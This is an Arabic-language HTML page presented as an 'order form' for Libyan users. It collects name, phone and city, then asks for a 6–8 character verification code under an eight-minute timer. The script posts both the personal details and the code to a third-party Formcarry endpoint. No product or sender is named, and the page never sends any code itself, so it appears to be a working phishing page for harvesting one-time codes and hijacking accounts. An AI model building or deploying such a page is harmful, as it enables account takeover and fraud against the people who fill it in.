<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>نموذج الطلب</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f1f1f1;
      padding: 20px;
      direction: rtl;
      text-align: right;
    }
    form, .code-box, #waitingPage {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px #ccc;
      max-width: 400px;
      margin: 20px auto;
    }
    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      margin-top: 15px;
      width: 100%;
      padding: 12px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    .code-box, #waitingPage {
      display: none;
    }
    .timer {
      margin-top: 10px;
      color: #d32f2f;
      font-weight: bold;
    }
    .error {
      color: red;
      font-size: 13px;
      display: none;
    }
  </style>
</head>
<body>

<form id="mainForm" onsubmit="submitForm(event)">
  <h2>نموذج الطلب</h2>

  <label for="fullName">الاسم الثلاثي</label>
  <input type="text" id="fullName" name="fullName" required oninput="validateForm()">
  <div class="error" id="nameError">يجب أن يكون الاسم أكثر من 7 أحرف عربية.</div>

  <label for="phone">رقم الهاتف</label>
  <input type="tel" id="phone" name="phone" required oninput="validateForm()">

  <label for="address">المدينة</label>
  <select id="address" name="address" required onchange="validateForm()">
    <option value="">اختر المدينة</option>
    <option value="طرابلس">طرابلس</option>
    <option value="بنغازي">بنغازي</option>
    <option value="مصراتة">مصراتة</option>
    <option value="البيضاء">البيضاء</option>
    <option value="زليتن">زليتن</option>
    <option value="سبها">سبها</option>
    <option value="الخمس">الخمس</option>
    <option value="درنة">درنة</option>
    <option value="سرت">سرت</option>
    <option value="طبرق">طبرق</option>
  </select>

  <button type="submit" id="submitBtn" disabled>أكمل الطلب</button>
</form>

<div class="code-box" id="codeBox">
  <h3>يرجى إدخال كود التوثيق</h3>
  <input type="text" id="verificationCode" placeholder="أدخل الكود (6–8 أرقام أو أحرف)" required>
  <button onclick="submitCode()">إرسال</button>
  <div class="timer" id="timer">الوقت المتبقي: 08:00</div>
</div>

<div id="waitingPage">
  <h2>تم استلام الكود</h2>
  <p>طلبك قيد المعالجة وسيتم الرد خلال ساعة.</p>
</div>

<script>
  const formcarryURL = "https://formcarry.com/s/12UxdOsTbaW";

  function validateForm() {
    const name = document.getElementById("fullName").value.trim();
    const phone = document.getElementById("phone").value.trim();
    const address = document.getElementById("address").value;
    const nameError = document.getElementById("nameError");

    const nameIsValid = /^[\u0600-\u06FF\s]{8,}$/.test(name);
    const phoneIsValid = /^\d{10,15}$/.test(phone);
    const addressIsValid = address !== "";

    if (!nameIsValid && name.length > 0) {
      nameError.style.display = "block";
    } else {
      nameError.style.display = "none";
    }

    document.getElementById("submitBtn").disabled = !(nameIsValid && phoneIsValid && addressIsValid);
  }

  function submitForm(event) {
    event.preventDefault();

    const formData = {
      fullName: document.getElementById('fullName').value.trim(),
      phone: document.getElementById('phone').value.trim(),
      address: document.getElementById('address').value,
    };

    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData)
    })
    .then(response => {
      if (response.ok) {
        document.getElementById("mainForm").style.display = "none";
        document.getElementById("codeBox").style.display = "block";
        startTimer(8 * 60); // 8 دقائق
      } else {
        alert("حدث خطأ أثناء إرسال البيانات.");
      }
    })
    .catch(error => {
      alert("فشل الاتصال بـ Formcarry.");
      console.error(error);
    });
  }

  function submitCode() {
    const code = document.getElementById('verificationCode').value.trim();
    const codeIsValid = /^[A-Za-z0-9]{6,8}$/.test(code);

    if (!codeIsValid) {
      alert("يرجى إدخال كود مكوّن من 6 إلى 8 أحرف أو أرقام فقط.");
      return;
    }

    document.getElementById('codeBox').style.display = "none";
    document.getElementById('waitingPage').style.display = "block";

    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code: code })
    }).catch(error => {
      console.error("فشل الإرسال إلى Formcarry:", error);
    });
  }

  function startTimer(duration) {
    let timer = duration;
    const timerDisplay = document.getElementById("timer");

    const countdown = setInterval(() => {
      const minutes = String(Math.floor(timer / 60)).padStart(2, '0');
      const seconds = String(timer % 60).padStart(2, '0');
      timerDisplay.textContent = `الوقت المتبقي: ${minutes}:${seconds}`;
      timer--;

      if (timer < 0) {
        clearInterval(countdown);
        timerDisplay.textContent = "انتهى الوقت!";
      }
    }, 1000);
  }
</script>

</body>
</html>
